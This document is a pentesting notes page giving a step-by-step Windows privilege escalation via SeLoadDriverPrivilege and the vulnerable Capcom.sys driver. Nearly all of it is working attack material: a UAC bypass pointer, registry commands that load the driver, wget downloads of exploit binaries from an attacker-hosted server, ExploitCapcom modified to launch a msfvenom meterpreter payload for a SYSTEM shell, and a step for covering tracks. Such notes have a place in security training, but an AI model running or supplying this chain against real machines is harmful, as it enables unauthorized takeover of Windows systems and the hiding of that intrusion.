---
title: SeLoadDriverPrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeLoadDriverPrivilege
---
# 🖨️ SeLoadDriverPrivilege


[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

!!! tip "Note"
	Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".


## Alternative #1  Having access to GUI

### Step 1. Check group memberships and privileges
Check our group membershipts:

```powershell
whoami /groups
```

We see Print Operators, which usually has the SeLoadDriverPrivilege. However when we check our permissions is not listed:

```powershell
whoami /priv
```

Output:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC. 
	- You can bypass it with  [UACMe](https://github.com/hfiref0x/UACME) repo features or any similar code approach.
	- You can also bypass it from user interface. Open a powershell with administrator permissions. 	

### Step 2. If disabled, enabled SeLoadDriverPrivilege
**1.** Now, next troubleshooting is that the `SeLoadDriverPrivilege` may be Disabled. To enable it, we will need the following:

- The executable `EnableSeLoadDriverPrivilege.exe` that we can compile using the forked repo [https://github.com/amandaguglieri/enabling-privileges](https://github.com/amandaguglieri/enabling-privileges).  
- The file Capcom.sys. I've forked it to [https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- The DriverView.exe utility, officially available at [https://www.nirsoft.net/utils/driverview.html](https://www.nirsoft.net/utils/driverview.html) and in my case, also uploaded to [my repo](https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe).

**2.** Compiling `EnableSeLoadDriverPrivilege.exe` . I've set up Visual Studio 2022 in a Windows Virtual Machine. 

```
# Go to https://github.com/amandaguglieri/Privescalation/tree/main/EnablePrivilegeScripts/enable-priv-tools and access to the .cpp files. In the case of EnableSeLoadDriverPrivilege.cpp, download it


# Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")
#include <stdio.h>
#include "tchar.h"

# Now, from the terminal (CTRL+ñ), compile:
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
# This will generate the required EnableSeLoadDriverPrivilege.exe. Save it to the folder from where you want to serve the payload to the target host.
```

**3.** Download the other required files (`Capcom.sys`  and `DriverView.exe`) to the folder from where you want to serve the payload to the target host.

```
# Download Capcom.sys
wget https://github.com/amandaguglieri/Privescalation/blob/main/EnablePrivilegeScripts/enable-priv-tools/releases/Capcom.sys

# Download DriverView.exe
wget https://github.com/amandaguglieri/Privescalation/blob/main/EnablePrivilegeScripts/enable-priv-tools/releases/DriverView.exe

# I added in the resouces folder also the compiled version of the EnableSeLoadDriverPrivilege.exe
wget https://github.com/amandaguglieri/Privescalation/blob/main/EnablePrivilegeScripts/enable-priv-tools/releases/EnableSeLoadDriverPrivilege.exe
```

**4.** Serve the files to the target host:

```
python3 -m http.server 80
```

**5.** Download the files to the target host:

```powershell
# open a powershell terminal and change the directory for instance to C:\Tools
cd C:\Tools
wget http://$attackerIP/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe
wget http://$attackerIP/Capcom.sys -outfile Capcom.sys
wget http://$attackerIP/DriverView.exe -outfile DriverView.exe
```

**6.** Save the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\test`. If test does not exist, create it:

```powershell
mkdir c:\test
copy Capcom.sys c:\test\Capcom.sys
```

**7.** Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

**8.** Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

**9.** Run the `EnableSeLoadDriverPrivilege.exe` binary.

```powershell
.\EnableSeLoadDriverPrivilege.exe
```

The Output should be something like this:

```powershell
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```


### Step 3. Use ExploitCapcom Tool to Escalate Privileges

**1.** Next, verify that the Capcom driver is now listed.

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

The output should be something like this:

```
Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

**2.** Now we will use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool for escalating privileges. I've cloned it into a windows virtual machine with Visual Studio 2022 installed (in my kali machine)

- Open Visual Studio 2022. Clone the project. Once cloned, right click and select "Compile". It's important to change the architecture to x64 in order to compile.
- Executable generated under "C:\Users\vboxuser\source\repos\ExploitCapcom\ExploitCapcom\x64\Release"

**3.** Upload the `ExploitCapcom.exe` file to the target machine:

```
# from the attacking machine
python3 -m http.server 80

# from the target host
wget http://$attackingIP/ExploitCapcom.exe -outfile ExploitCapcom.exe
```

**4.** Run the binary:

```powershell
.\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges.


## Alternative #2  With no access to GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

**1.** In our attacking machine, open the Visual Studio from the windows virtualbox machine and modify these lines:

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Use these ones instead:

```c
// Launches a command shell process
static bool LaunchShell()
{
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Now compile the code and obtain the `ExploitCapcom.exe` file that will open a revshell.exe.

Generate the revshell.exe with msfvenom in your attacking machine:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=10.10.14.39 LPORT=1234 -f exe -o revshell.exe
```


Copy `revshell.exe` and  `ExploitCapcom.exe` files to the host machine.

We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.


## Alternative #3  Automating the Steps


We can use a tool such as [EoPLoadDriver](https://github.com/amandaguglieri/EoPLoadDriver/releases/tag/1.0) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:

```powershell
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```


We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary. [See my compiled version](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeLoadDriverPrivilege/releases).

## Clean-up

We can cover our tracks a bit by deleting the registry key added earlier.

```cmd-session
reg delete HKCU\System\CurrentControlSet\Capcom
```

